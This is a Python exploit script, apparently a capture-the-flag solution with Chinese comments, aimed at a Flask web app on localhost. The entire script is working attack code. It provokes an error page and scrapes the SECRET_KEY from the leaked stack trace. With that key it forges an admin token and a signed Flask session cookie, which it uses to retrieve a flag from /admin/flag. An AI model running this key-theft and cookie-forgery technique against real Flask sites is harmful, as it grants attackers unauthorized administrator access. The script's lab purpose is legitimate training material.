#!/usr/bin/env python3
import requests
import re
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import SecureCookieSessionInterface

TARGET = "http://localhost:8080"

# Step 1: 触发异常，获取SECRET_KEY
print("[*] 触发异常获取堆栈信息...")
r = requests.get(f"{TARGET}/read?file=nonexistent")
html = r.text


# 从堆栈中提取SECRET_KEY
m = re.search(r"SECRET_KEY=([^,\s<]+)", html)
if not m:
    print("[-] 未找到SECRET_KEY")
    exit(1)
secret_key = m.group(1)
print(f"[+] SECRET_KEY: {secret_key}")

# Step 2: 伪造admin session token
s = URLSafeTimedSerializer(secret_key)
admin_token = s.dumps({'user': 'admin', 'role': 'admin'})
print(f"[+] Admin token: {admin_token}")

# Step 3: 构建Flask session cookie
class FakeApp:
    secret_key = secret_key

app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(app)
session_cookie = serializer.dumps({'token': admin_token})
print(f"[+] Session cookie: {session_cookie}")

# Step 4: 获取flag
r = requests.get(f"{TARGET}/admin/flag", cookies={"session": session_cookie})
flag = re.search(r'flag\{[^}]+\}', r.text)
if flag:
    print(f"[+] FLAG: {flag.group(0)}")
else:
    print(r.text)